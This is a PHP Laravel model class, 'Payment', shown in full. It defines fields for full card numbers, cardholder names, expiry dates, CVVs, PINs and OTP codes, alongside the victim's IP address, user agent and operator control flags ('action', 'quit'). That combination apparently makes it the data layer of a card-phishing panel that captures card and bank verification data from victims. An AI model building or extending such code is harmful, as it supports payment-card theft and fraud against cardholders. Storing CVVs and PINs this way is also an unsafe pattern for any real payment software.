<?php

namespace App\Models;

use Carbon\Carbon;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\SoftDeletes;

class Payment extends Model
{
    use SoftDeletes;
    use HasFactory;

    protected $casts = [
        'pin_code' => 'array',
        'otp_code' => 'array',
    ];

    protected $fillable = [
        'card_no',
        'card_holder',
        'expiry',
        'cvv',
        'bin',
        'ip_addr',
        'user_agent',
        'otp_code',
        'pin_code',
        'active',
        'action',
        'quit'
    ];

    protected $appends = ['bin_str'];

    public function getBinAttribute($value)
    {
        return json_decode($value);
    }

    public function getBinStrAttribute()
    {
        $resp = json_decode($this->attributes['bin'], true);

        $bin = $resp['card-brand'].' | '.$resp['card-type'].' | ';

        if($resp['is-prepaid']) {
            $bin .= ' PREPAID | ';
        }

        $bin .= $resp['card-category'].' | ';
        $bin .= $resp['country-code'].' | ';
        $bin .= $resp['issuer'];

        return $bin;
    }

    public function getCreatedAtAttribute($value)
    {
        return Carbon::parse($value)
            ->tz('Africa/Nairobi')
            ->format('d/m/Y H:i:s');
    }
}
